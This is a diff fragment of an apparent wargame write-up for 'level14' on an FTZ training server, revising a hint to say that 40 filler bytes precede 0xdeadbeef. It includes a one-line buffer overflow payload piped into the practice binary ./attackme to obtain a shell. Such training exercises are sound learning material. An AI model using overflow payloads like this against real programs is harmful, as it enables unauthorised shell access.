@@ -99,7 +99,7 @@ int check;
 	}
 ```
 
-In the hint, you need to input 0xdeadbeef in the int check, then you will get sh.
+In the hint, you need to input 40bytes dummy strings and then 0xdeadbeef in the int check, then you will get sh.
 
 ```
 [level14@ftz level14]$ (python -c 'print "A"*40+"\xef\xbe\xad\xde"'; cat) | ./attackme
